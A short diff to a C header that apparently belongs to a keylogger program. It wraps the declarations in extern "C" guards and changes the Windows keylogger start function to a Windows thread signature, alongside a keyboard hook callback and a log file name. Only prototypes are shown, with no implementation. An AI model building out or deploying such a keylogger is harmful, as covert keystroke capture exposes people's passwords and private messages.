@@ -11,14 +11,21 @@
 #endif
 
 
+#ifdef __cplusplus
+extern "C" {
+#endif
+
 // windows 
 extern const char keyloggerfile[256];
 LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-void* StartWindowsKeylogger(void* arg);
 
+DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
 // linux
 
+#ifdef __cplusplus
+}
+#endif
 
 #endif
 
